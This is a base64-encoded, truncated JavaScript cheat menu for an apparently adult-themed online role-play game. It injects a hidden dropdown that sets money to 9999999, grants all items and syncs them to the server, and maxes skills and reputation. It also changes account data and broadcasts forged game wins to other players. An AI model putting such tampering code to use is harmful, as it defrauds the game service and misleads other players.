bjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwLjVweCI7Cn0pOwpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgovL0Ryb3Bkb3duIE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIGZvcmNlY2xvc2VtZW51KCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgIERpYWxvZ0xlYXZlKCk7CiAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgfQoKIC8vIENyZWF0ZSB0aGUgZHJvcGRvd24gbWVudQp2YXIgc2VsZWN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2VsZWN0Iik7CnNlbGVjdC5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLnBhZGRpbmcgPSAiNHB4IjsKc2VsZWN0LnN0eWxlLndpZHRoID0gIjIwMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblRvcCA9ICItMjBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5SaWdodCA9ICIycHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luQm90dG9tID0gIjNweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjJweCI7CnZhciBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEudmFsdWUgPSAib3B0MSI7Cm9wdGlvbjEudGV4dCA9ICJQZXJzb25hbGlzYXRpb24gTWVudSI7Cm9wdGlvbjEuc2VsZWN0ZWQgPSB0cnVlOwpvcHRpb24xLmRpc2FibGVkID0gdHJ1ZTsKdmFyIG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMi52YWx1ZSA9ICJvcHQyIjsKb3B0aW9uMi50ZXh0ID0gIkVkaXQgQ2FzaCI7CnZhciBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjMudmFsdWUgPSAib3B0MyI7Cm9wdGlvbjMudGV4dCA9ICJNYXggU2tpbGxzIjsKdmFyIG9wdGlvbjQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNC52YWx1ZSA9ICJvcHQ0IjsKb3B0aW9uNC50ZXh0ID0gIk1heCBSZXB1dGF0aW9uIjsKdmFyIG9wdGlvbjUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNS52YWx1ZSA9ICJvcHQ1IjsKb3B0aW9uNS50ZXh0ID0gIlB1cmNoYXNlIEV2ZXJ5dGhpbmciOwp2YXIgb3B0aW9uNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb242LnZhbHVlID0gIm9wdDYiOwpvcHRpb242LnRleHQgPSAiUmVsZWFzZSBPd25lciBDb2xsYXIiOwp2YXIgb3B0aW9uNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb243LnZhbHVlID0gIm9wdDciOwpvcHRpb243LnRleHQgPSAiKzEgTEFSUCBMZXZlbCI7CnZhciBvcHRpb244ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjgudmFsdWUgPSAib3B0OCI7Cm9wdGlvbjgudGV4dCA9ICJCZWNvbWUgRXNjYXBlZCBQYXRpZW50IjsKdmFyIG9wdGlvbjkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOS52YWx1ZSA9ICJvcHQ5IjsKb3B0aW9uOS50ZXh0ID0gIkJlY29tZSBDbHViIFNsYXZlIjsKdmFyIG9wdGlvbjEwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEwLnZhbHVlID0gIm9wdDEwIjsKb3B0aW9uMTAudGV4dCA9ICJSZWxlYXNlIENsdWIgVGl0bGUiOwp2YXIgb3B0aW9uMTEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTEudmFsdWUgPSAib3B0MTEiOwpvcHRpb24xMS50ZXh0ID0gIlNldCBHR1RTIExldmVsIjsKdmFyIG9wdGlvbjEyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEyLnZhbHVlID0gIm9wdDEyIjsKb3B0aW9uMTIudGV4dCA9ICJTZXQgRG9tL1N1YiBMZXZlbCI7CnZhciBvcHRpb24xMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMy52YWx1ZSA9ICJvcHQxMyI7Cm9wdGlvbjEzLnRleHQgPSAiU2V0IE5pY2tuYW1lIjsKdmFyIG9wdGlvbjE0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE0LnZhbHVlID0gIm9wdDE0IjsKb3B0aW9uMTQudGV4dCA9ICJGb3JjZSBPcmdhc20iOwp2YXIgb3B0aW9uMTUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTUudmFsdWUgPSAib3B0MTUiOwpvcHRpb24xNS50ZXh0ID0gIkJDTSBEaXNjb3JkIjsKdmFyIG9wdGlvbjE2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE2LnZhbHVlID0gIm9wdDE2IjsKb3B0aW9uMTYudGV4dCA9ICJGb3JjZSBMb2JieSI7CnZhciBvcHRpb24xNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNy52YWx1ZSA9ICJvcHQxNyI7Cm9wdGlvbjE3LnRleHQgPSAiTEFSUCBPcHRpb25zIjsKdmFyIG9wdGlvbjE4ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE4LnZhbHVlID0gIm9wdDE4IjsKb3B0aW9uMTgudGV4dCA9ICJFbW90ZSBNZW51IChgICsgRSkiOwp2YXIgb3B0aW9uMTkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTkudmFsdWUgPSAib3B0MTkiOwpvcHRpb24xOS50ZXh0ID0gIlBlcnNpc3RhbnQgU2V0dGluZ3MgKGAgKyBTKSI7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjIpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb240KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEyKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjUpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb243KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjgpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xOSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xNSk7CgoKCi8vIENyZWF0ZSBhIGJ1dHRvbiB0byBzaG93IHRoZSBkcm9wZG93biBtZW51CnZhciBkcm9wZG93bkJ1dHRvbiA9IGNyZWF0ZUJ1dHRvbigiUGVyc29uYWxpc2F0aW9uIiwgZnVuY3Rpb24oKSB7CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwp9KTsKLy8gQ1NTIHRvIG1ha2UgdGhlIGJ1dHRvbiBpbnZpc2libGUgYW5kIHRha2Ugbm8gc3BhY2UKZHJvcGRvd25CdXR0b24uc3R5bGUub3BhY2l0eSA9ICIwIjsKZHJvcGRvd25CdXR0b24uc3R5bGUucG9pbnRlckV2ZW50cyA9ICJub25lIjsKZHJvcGRvd25CdXR0b24uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS50b3AgPSAiLTk5OTlweCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLmxlZnQgPSAiLTk5OTlweCI7CnNlbGVjdC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7IC8vIFN0b3AgZXZlbnQgcHJvcGFnYXRpb24KfSk7CgpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgdmFyIHNlbGVjdGVkT3B0aW9uID0gc2VsZWN0Lm9wdGlvbnNbc2VsZWN0LnNlbGVjdGVkSW5kZXhdLnZhbHVlOwogIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gOTk5OTk5OQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDIiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDIKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gcHJvbXB0KCJFbnRlciBDYXNoIEFtb3VudCIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMwogICAgamF2YXNjcmlwdDpTa2lsbENoYW5nZSgiSW5maWx0cmF0aW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIlNlbGZCb25kYWdlIiwgMTApOy8vc2VsZi10aWUKICAgIFNraWxsQ2hhbmdlKCJXaWxscG93ZXIiLCAxMCk7Ly9SZXNpc3Qgb3JnYXNtcwogICAgU2tpbGxDaGFuZ2UoIkV2YXNpb24iLCAxMCk7Ly9CYXR0bGUgc2tpbGxzCiAgICBTa2lsbENoYW5nZSgiQm9uZGFnZSIsIDEwKTsvL1RpZSBvdGhlcnMKICAgIFNraWxsQ2hhbmdlKCJEcmVzc2FnZSIsIDEwKTsvL0FCREwKICAgIFNraWxsQ2hhbmdlKCJMb2NrUGlja2luZyIsIDEwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDQiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDQKICAgIGphdmFzY3JpcHQ6UmVwdXRhdGlvbkNoYW5nZSgiR2FtaW5nIiwgMTAwKTsvL0FyY2FkZSBhbmQgS2lua3lEdW5nZW9uCiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJHYW1ibGluZyIsIDEwMCk7Ly9HYW1ibGluZyByb29tCiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJMQVJQIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIk1haWQiLCAxMDApOy8vQ2FuIGJlIGEgTWFpZAogICAgUmVwdXRhdGlvbkNoYW5nZSgiQUJETCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJOdXJzZSIsIDEwMCk7Ly9DYW4gYmUgYSBOdXJzZQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNQogICAgamF2YXNjcmlwdDpTZXJ2ZXJQbGF5ZXJTeW5jCiAgICBBc3NldEZlbWFsZTNEQ0cuZm9yRWFjaChncm91cD0+Z3JvdXAuQXNzZXQuZm9yRWFjaChpdGVtPT5JbnZlbnRvcnlBZGQoUGxheWVyLCBpdGVtLk5hbWUsIGdyb3VwLkdyb3VwKSkpOwogICAgU2VydmVyUGxheWVySW52ZW50b3J5U3luYygpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNgogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlSZW1vdmUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgTG9nQWRkKCJSZWxlYXNlZENvbGxhciIsICJPd25lclJ1bGUiKTsgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ3IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA3CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIExBUlAgc2Vzc2lvbiAmIHNlbGVjdCBjbGFzcyBiZWZvcmUgcnVubmluZycpOwogICAgR2FtZUxBUlBMZXZlbFByb2dyZXNzKDEwMCkgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ4IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA4CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiRXNjYXBlZCIsICJBc3lsdW0iLCBDdXJyZW50VGltZSArIDk5OTk5OTk5OSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ5IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA5CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSArIDk5OTk5OTk5OSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTAKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkJsb2NrQ2hhbmdlIiwgIlJ1bGUiLCBDdXJyZW50VGltZSk7CiAgICBNYW5hZ2VtZW50SXNDbHViU2xhdmUgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiBmYWxzZQogICAgfQogICAgTWFuYWdlbWVudENsdWJTbGF2ZURpYWxvZyA9IGZ1bmN0aW9uKFBsYXllcikge30KICAgIE1hbmFnZW1lbnRGaW5pc2hDbHViU2xhdmUoKQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTEiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDExCiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIEdHVFMgc2Vzc2lvbiBiZWZvcmUgcnVubmluZywgcmVmcmVzaCB0byBzZWUgY2hhbmdlcycpOwogICAgUGxheWVyLkdhbWUuR0dUUy5MZXZlbCA9IHByb21wdCgiRW50ZXIgR0dUUyBMZXZlbCAoMS02KSIpOzsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsKICAgIEdhbWU6IFBsYXllci5HYW1lCiAgICB9KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTIKICAgIGphdmFzY3JpcHQ6RGlhbG9nU2V0UmVwdXRhdGlvbigiRG9taW5hbnQiLCBwcm9tcHQoIkVudGVyIFN1Yi9Eb20gUmVwICgtMTAwIHRvIDEwMCkiKSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEzIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMwogICAgamF2YXNjcmlwdDpuYW1lID0gcHJvbXB0KCJFbnRlciBOaWNrbmFtZSIpOzsKICAgIFBsYXllci5OaWNrbmFtZSA9IG5hbWU7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7IE5pY2tuYW1lOiBuYW1lIH0sIHRydWUpOyAgIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE0IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNAogICAgamF2YXNjcmlwdDpBY3Rpdml0eVNldEFyb3VzYWwoUGxheWVyLCAxKTsKICAgIEFjdGl2aXR5T3JnYXNtUHJlcGFyZShQbGF5ZXIsIHRydWUpOwogICAgQWN0aXZpdHlPcmdhc21HYW1lUmVzaXN0Q291bnQgPSAxOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTUKICAgIGphdmFzY3JpcHQ6d2luZG93Lm9wZW4oJ2h0dHBzOi8vZGlzY29yZC5nZy92M0pCanlTNG14JywgJ19ibGFuaycpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTYKICAgIGphdmFzY3JpcHQ6KGZ1bmN0aW9uKCkge2xldCBpbnB1dCA9IHByb21wdCgiTWFsZSAvIEZlbWFsZSAvIE1peGVkIik7CiAgICBsZXQgcGxhY2Vob2xkZXI7CiAgICAKICAgIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWFsZSIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiTSI7CiAgICB9IGVsc2UgaWYgKGlucHV0LnRvTG93ZXJDYXNlKCkgPT09ICJtaXhlZCIpIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiWCI7CiAgICB9IGVsc2UgewogICAgICBwbGFjZWhvbGRlciA9ICIiOwogICAgfSAgCgogICAgCiAgICBDaGF0Um9vbVN0YXJ0KHBsYWNlaG9sZGVyLCAiIiwgbnVsbCwgbnVsbCwgIkludHJvZHVjdGlvbiIsIEJhY2tncm91bmRzVGFnTGlzdCk7CiAgfSkoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTciKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE3CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIlN0YXJ0IGEgTEFSUCBSb29tIGFzIEFkbWluIEZpcnN0XG5TdGFydCAvIFNraXAgLyBNaXhlZCAvIFNodWZmbGUgLyBUZWFtIC8gV2luIChjb2xvcikiKS50b0xvd2VyQ2FzZSgpOwoKICAgIGlmIChpbnB1dCA9PT0gInN0YXJ0IikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlN0YXJ0IiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJza2lwIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUdhbWUiLCB7IEdhbWVQcm9ncmVzczogIlNraXAiIH0pOwogICAgfSBlbHNlIGlmIChpbnB1dCA9PT0gInNodWZmbGUiKSB7CiAgICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7IE1lbWJlck51bWJlcjogQ2hhdFJvb21DaGFyYWN0ZXJbMV0uTWVtYmVyTnVtYmVyLCBBY3Rpb246ICJTaHVmZmxlIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJ0ZWFtIikgewogICAgICBjb25zdCBEaWN0aW9uYXJ5ID0gbmV3IERpY3Rpb25hcnlCdWlsZGVyKCkKICAgICAgLnNvdXJjZUNoYXJhY3RlcihQbGF5ZXIpCiAgICAgIC5idWlsZCgpOwogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21DaGF0IiwgeyBDb250ZW50OiAiTEFSUENoYW5nZVRlYW1DbGFzcyIsIFR5cGU6ICJBY3Rpb24iLCBEaWN0aW9uYXJ5OiBEaWN0aW9uYXJ5IH0pOwogIH0gZWxzZSBpZiAoaW5wdXQuc3RhcnRzV2l0aCgid2luIikpIHsKICAgICAgbGV0IGNvbG9yID0gaW5wdXQuc2xpY2UoNCkudHJpbSgpOwogICAgICBjb2xvciA9IGNvbG9yLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsgY29sb3Iuc2xpY2UoMSk7CiAgICAgIEdhbWVMQVJQQWRkQ2hhdExvZygiRW5kR2FtZSIsIFBsYXllciwgUGxheWVyLCBPbmxpbmVHYW1lRGljdGlvbmFyeVRleHQoIlRlYW0iICsgY29sb3IpLCAwLCAwLCAiIzAwMDBCMCIpOwogICAgfQogIH0pKCk7CgogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxOCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTgKICAvLyBDcmVhdGUgYW5kIGRpc3BsYXkgdGhlIGJ1dHRvbiBjb250YWluZXIKICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgYnV0dG9uQ29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE5IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxOQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwogICAgc2V0dGluZ3NNZW51LnN0eWx